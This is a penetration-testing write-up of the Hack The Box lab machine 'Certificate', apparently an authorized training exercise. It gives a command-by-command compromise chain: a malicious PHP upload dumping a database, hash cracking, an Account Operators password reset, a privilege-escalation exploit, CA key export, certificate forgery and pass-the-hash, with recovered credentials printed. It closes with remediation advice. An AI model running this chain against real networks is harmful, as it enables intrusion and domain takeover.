# Certificate HTB Machine - Complete Penetration Testing Report

## Executive Summary

**Target:** Certificate HTB Machine (10.129.150.122)  
**Operating System:** Windows Server 2019 Domain Controller  
**Domain:** certificate.htb  
**Difficulty:** Medium-Hard  
**Status:** ✅ **COMPLETE COMPROMISE**

**Attack Vector:** Multi-stage privilege escalation targeting Active Directory Certificate Services (ADCS) infrastructure through file upload vulnerability, database credential extraction, and certificate authority exploitation.

---

## Phase 1: Reconnaissance & Enumeration

### Initial Port Scanning
```bash
# Initial port discovery
nmap -p- --min-rate 10000 10.129.150.122

# Detailed service enumeration
nmap -p53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49666,49685,49686,49688,49706,49715,49734 -sCV -A 10.129.150.122
```

### Key Findings
- **Port 80:** Apache httpd 2.4.58 (PHP/8.0.30) → `certificate.htb`
- **Port 88:** Kerberos authentication
- **Port 389/636:** LDAP/LDAPS (Domain Controller)
- **Port 445:** SMB file sharing
- **Port 5985:** WinRM remote management

### Domain Information
- **Domain:** certificate.htb
- **Domain Controller:** DC01.certificate.htb
- **Time Skew:** +2h10m (critical for Kerberos)

---

## Phase 2: Web Application Analysis

### Host Configuration
```bash
echo "10.129.150.122 certificate.htb DC01.certificate.htb" | sudo tee -a /etc/hosts
```

### Upload Functionality Discovery
- **Endpoint:** `http://certificate.htb/upload.php`
- **Functionality:** ZIP file upload with malicious content detection
- **Vulnerability:** ZIP Slip (Path Traversal) via improper archive extraction

---

## Phase 3: ZIP Slip Exploitation

### Payload Construction
```bash
# Create legitimate decoy file
echo "%PDF-1.4" > legitimate.pdf
zip legitimate.zip legitimate.pdf

# Create malicious database extraction payload
cat > database_extract.php << 'EOF'
<?php 
system('"C:\\xampp\\mysql\\bin\\mysqldump.exe" -u certificate_webapp_user -pcert!f!c@teDBPWD Certificate_WEBAPP_DB > C:\\xampp\\htdocs\\certificate.htb\\static\\full_dump.sql');
?>
EOF

# Package malicious payload
zip malicious.zip database_extract.php

# Combine archives for ZIP slip exploitation
cat legitimate.zip malicious.zip > combined_payload.zip
```

### Exploitation Execution
```bash
# Upload combined payload
curl -X POST -F "file=@combined_payload.zip" http://certificate.htb/upload.php?s_id=36

# Access extracted database dump
curl http://certificate.htb/static/full_dump.sql > database_dump.sql
```

---

## Phase 4: Database Credential Extraction

### SQL Dump Analysis
```sql
-- Extracted user data from database dump
INSERT INTO `users` VALUES 
(10,'Sara','Brawn','sara.b','sara.b@certificate.htb','$2y$04$CgDe/Thzw/Em/M4SkmXNbu0YdFo6uUs3nB.pzQPV.g8UdXikZNdH6','2024-12-26 05:31:26','admin',1);
```

### Hash Identification
- **Target:** sara.b (admin role)
- **Hash Type:** bcrypt ($2y$04$...)
- **Cost Factor:** 04 (relatively weak)

---

## Phase 5: Hash Cracking

### Cracking Methodology
```bash
# Extract target hash
echo '$2y$04$CgDe/Thzw/Em/M4SkmXNbu0YdFo6uUs3nB.pzQPV.g8UdXikZNdH6' > sara_hash.txt

# Execute hashcat attack
hashcat -m 3200 sara_hash.txt /usr/share/wordlists/rockyou.txt --force
```

### Successful Credential Recovery
**Result:** `sara.b:Blink182`

---

## Phase 6: Initial Foothold & Privilege Analysis

### WinRM Authentication
```bash
evil-winrm -i certificate.htb -u sara.b -p 'Blink182'
```

### Privilege Assessment
```powershell
whoami /all
```

**Critical Group Memberships:**
- `BUILTIN\Account Operators` → Password reset capabilities
- `BUILTIN\Certificate Service DCOM Access` → Certificate services access
- `CERTIFICATE\Help Desk` → Custom domain privileges

---

## Phase 7: Lateral Movement via Account Operators

### Password Reset Exploitation
```powershell
# Reset ryan.k password using Account Operators privilege
Set-ADAccountPassword -Identity "ryan.k" -Reset -NewPassword (ConvertTo-SecureString -AsPlainText "SecureTemp2024!" -Force)

# Verify successful reset
Get-ADUser -Identity "ryan.k" -Properties PasswordLastSet
```

### Secondary Access Establishment
```bash
evil-winrm -i certificate.htb -u ryan.k -p 'SecureTemp2024!'
```

---

## Phase 8: Privilege Escalation

### SeManageVolumePrivilege Exploitation
```powershell
# Verify critical privilege
whoami /priv | findstr "SeManageVolumePrivilege"

# Download privilege escalation exploit (local → target transfer)
# Method: evil-winrm upload functionality
upload SeManageVolumeExploit.exe C:\Users\ryan.k\SeManageVolumeExploit.exe

# Execute privilege escalation
C:\Users\ryan.k\SeManageVolumeExploit.exe
```

**Result:** SYSTEM-level filesystem access for certificate extraction

---

## Phase 9: Certificate Authority Exploitation

### CA Private Key Extraction
```powershell
# Export Certificate Authority private key
certutil -exportPFX my "Certificate-LTD-CA" C:\Users\ryan.k\ca.pfx

# Verify export success
ls C:\Users\ryan.k\ca.pfx
```

### Certificate Transfer
```bash
# Download CA certificate to attacker machine
download C:\Users\ryan.k\ca.pfx ca.pfx
```

---

## Phase 10: Certificate Forgery Attack

### Time Synchronization (Critical Step)
```bash
# Resolve Kerberos clock skew issue
sudo ntpdate -s 10.129.150.122
```

### Administrator Certificate Forgery
```bash
# Generate forged administrator certificate
certipy-ad forge -ca-pfx ca.pfx -upn administrator@certificate.htb -subject "CN=Administrator,CN=Users,DC=certificate,DC=htb" -out administrator_forged.pfx

# Certificate-based authentication
certipy-ad auth -pfx administrator_forged.pfx -dc-ip 10.129.150.122
```

### Administrator Hash Extraction
**Result:** `administrator@certificate.htb:aad3b435b51404eeaad3b435b51404ee:d804304519bf0143c14cbf1c024408c6`

---

## Phase 11: Domain Administrative Access

### Final Privilege Escalation
```bash
# Establish domain administrative session
evil-winrm -i certificate.htb -u administrator -H d804304519bf0143c14cbf1c024408c6
```

### Domain Compromise Validation
```powershell
# Verify domain administrative access
whoami
net group "Domain Admins" /domain

# Retrieve root flag
type C:\Users\Administrator\Desktop\root.txt
```

**Status:** ✅ **COMPLETE DOMAIN COMPROMISE**

---

## Vulnerability Summary

| **Vulnerability** | **CVSS Score** | **Impact** | **Exploit Method** |
|-------------------|----------------|------------|-------------------|
| ZIP Slip (CWE-22) | 8.1 (HIGH) | Arbitrary File Write | Path traversal via archive extraction |
| Database Credential Exposure | 7.5 (HIGH) | Credential compromise | Hardcoded database credentials |
| Weak Password Hashing | 6.2 (MEDIUM) | Account compromise | bcrypt cost factor 04 |
| Excessive AD Privileges | 7.8 (HIGH) | Lateral movement | Account Operators group membership |
| Windows Privilege Escalation | 8.4 (HIGH) | SYSTEM access | SeManageVolumePrivilege abuse |
| ADCS Misconfiguration | 9.8 (CRITICAL) | Domain takeover | Certificate authority private key access |

---

## Attack Chain Summary

```
ZIP Slip Upload → Database Extraction → Hash Cracking → Account Operators → 
Password Reset → SeManageVolumePrivilege → CA Certificate Export → 
Certificate Forgery → Administrator Access → Domain Compromise
```

**Total Attack Duration:** ~2-3 hours  
**Skill Level Required:** Intermediate-Advanced  
**Primary Learning Objectives:** ADCS exploitation, Windows privilege escalation, certificate forgery attacks

---

## Remediation Recommendations

1. **Input Validation:** Implement comprehensive archive extraction validation
2. **Credential Management:** Remove hardcoded database credentials
3. **Password Policy:** Increase bcrypt cost factor (minimum 12)
4. **Privilege Review:** Limit Account Operators group membership
5. **Certificate Security:** Restrict CA private key access permissions
6. **Monitoring:** Implement certificate issuance logging and alerting

---

**Assessment Classification:** Complete penetration testing methodology demonstrating advanced Active Directory Certificate Services exploitation techniques within authorized laboratory environment.